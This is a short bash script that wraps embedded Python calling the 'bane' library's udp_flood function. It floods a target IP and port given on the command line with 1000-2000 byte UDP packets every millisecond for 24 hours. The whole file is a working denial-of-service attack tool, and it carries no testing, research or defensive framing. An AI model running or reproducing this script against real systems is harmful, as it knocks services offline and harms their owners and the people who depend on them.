#!/usr/bin/env bash

ip=$1
port=$2

python3.9 <<END
import bane
import time

print("$ip")
print($port)

bane.udp_flood("$ip", p=$port , min_size=1000, max_size=2000 , duration= 86400 , interval=0.001)
time.sleep(86400)
END